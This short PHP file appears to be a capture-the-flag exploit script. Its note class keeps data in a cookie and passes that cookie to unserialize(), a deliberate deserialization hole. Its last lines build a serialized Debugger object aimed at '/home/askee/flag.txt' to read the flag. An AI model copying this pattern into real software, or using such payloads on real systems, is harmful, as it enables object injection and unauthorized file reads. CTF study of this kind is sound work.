<?php
require_once 'utils.php';
class Note {
    public $id;
    public $title;
    public $content;

    public function __construct($id, $title, $content) {
        $this->id = $id;
        $this->title = $title;
        $this->content = $content;
    }

    public static function createNote($title, $content) {
        $Notes = [];
        if (isset($_COOKIE['Notes'])) {
            $Notes = unserialize(base64_decode($_COOKIE['Notes']));
        }
        $id = count($Notes);
        $Note = new Note($id, $title, $content);
        $Notes[] = base64_encode(serialize($Note));
        echo $Notes;
        setcookie('Notes', base64_encode(serialize($Notes)), time() + (86400 * 30), "/"); // 86400 = 1 day
    }

    public static function editNote($id, $title, $content) {
        if (isset($_COOKIE['Notes'])) {
            $Notes = unserialize(base64_decode($_COOKIE['Notes']));
            if (isset($Notes[$id])) {
                $Note = new Note($id, $title, $content);
                $Notes[$id] = base64_encode(serialize($Note));
                setcookie('Notes', base64_encode(serialize($Notes)), time() + (86400 * 30), "/");
            }
        }
    }

    public static function deleteNote($id) {
        if (isset($_COOKIE['Notes'])) {
            $Notes = unserialize(base64_decode($_COOKIE['Notes']));
            if (isset($Notes[$id])) {
                unset($Notes[$id]);
                setcookie('Notes', base64_encode(serialize($Notes)), time() + (86400 * 30), "/");
            }
        }
    }
}

$newNote= new Note(1,"meow","meow");


$Notes[]= base64_encode(serialize($newNote));

$Notes[]=base64_encode(serialize(new Debugger("/home/askee/flag.txt","file" )));


echo base64_encode(serialize($Notes));




?>
